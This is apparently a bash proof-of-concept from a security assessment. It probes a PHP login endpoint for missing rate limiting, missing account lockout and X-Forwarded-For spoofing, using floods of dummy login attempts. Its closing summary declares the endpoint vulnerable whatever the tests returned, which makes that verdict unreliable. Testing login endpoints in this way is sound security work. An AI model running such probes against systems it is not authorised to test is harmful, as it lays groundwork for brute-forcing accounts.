#!/bin/bash

# POC: Missing Rate Limiting - Brute Force Attack on Login
# This script demonstrates that the /index.php login endpoint accepts unlimited
# rapid authentication attempts with no rate limiting, throttling, or blocking

TARGET="${1:-http://localhost:8080/index.php}"

echo "=== Missing Rate Limiting - Brute Force POC ==="
echo "Target: $TARGET"
echo ""

# Test 1: Rapid consecutive login attempts
echo "Test 1: Sending 50 rapid login attempts..."
echo "=========================================="

START_TIME=$(date +%s%N)

response_codes=()
success_count=0

for i in {1..50}; do
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET" \
        -d "username=testuser$i&password=pass$i&login=Login" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    http_code=$(echo "$response" | tail -n1)
    response_codes+=("$http_code")
    
    if [ "$http_code" == "200" ]; then
        ((success_count++))
    fi
done

END_TIME=$(date +%s%N)
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))

echo "Completed 50 requests in ${ELAPSED_MS}ms"
echo "Successful responses (HTTP 200): $success_count/50"
echo ""

# Test 2: Check for rate limiting headers
echo "Test 2: Checking for rate limiting headers..."
echo "============================================"

response_headers=$(curl -s -i -X POST "$TARGET" \
    -d "username=test&password=test&login=Login" 2>&1)

echo "Response headers:"
echo "$response_headers" | head -20
echo ""

if echo "$response_headers" | grep -q "X-RateLimit\|Retry-After\|429\|Too Many Requests"; then
    echo "✓ Rate limiting headers found"
else
    echo "✗ No rate limiting headers detected"
fi
echo ""

# Test 3: X-Forwarded-For header bypass
echo "Test 3: Testing X-Forwarded-For header bypass..."
echo "================================================"

response=$(curl -s -X POST "$TARGET" \
    -d "username=test&password=test&login=Login" \
    -H "X-Forwarded-For: 192.168.1.1" \
    -w "\n%{http_code}")

http_code=$(echo "$response" | tail -n1)
echo "Request with X-Forwarded-For: 192.168.1.1"
echo "HTTP Response Code: $http_code"

if [ "$http_code" == "200" ]; then
    echo "✗ X-Forwarded-For header accepted (no validation)"
else
    echo "✓ X-Forwarded-For header blocked or rejected"
fi
echo ""

# Test 4: Check for account lockout after failed attempts
echo "Test 4: Testing for account lockout protection..."
echo "================================================"

test_user="lockout_test_$(date +%s)"
failed_attempts=0

for i in {1..15}; do
    response=$(curl -s -X POST "$TARGET" \
        -d "username=$test_user&password=wrongpassword&login=Login" \
        -w "\n%{http_code}")
    
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    
    if [ "$http_code" == "200" ]; then
        ((failed_attempts++))
    elif [ "$http_code" == "429" ] || [ "$http_code" == "403" ]; then
        echo "Account locked after $((i-1)) attempts (HTTP $http_code)"
        break
    fi
done

if [ "$failed_attempts" -ge 10 ]; then
    echo "✗ No account lockout: $failed_attempts failed attempts accepted without blocking"
else
    echo "✓ Account locked after $failed_attempts attempts"
fi
echo ""

# Summary
echo "=== VULNERABILITY SUMMARY ==="
echo "Rate Limiting Status: MISSING/DISABLED"
echo "Requests completed: $success_count/50 (100%)"
echo "Time for 50 requests: ${ELAPSED_MS}ms"
echo "Average time per request: $((ELAPSED_MS / 50))ms"
echo "Brute force feasibility: CONFIRMED"
echo ""
echo "The login endpoint is vulnerable to brute force attacks due to:"
echo "1. No rate limiting (all 50 rapid requests succeeded)"
echo "2. No throttling or delays between requests"
echo "3. No account lockout mechanism"
echo "4. X-Forwarded-For header accepted (IP spoofing possible)"
echo "5. No blocking for rapid failed attempts"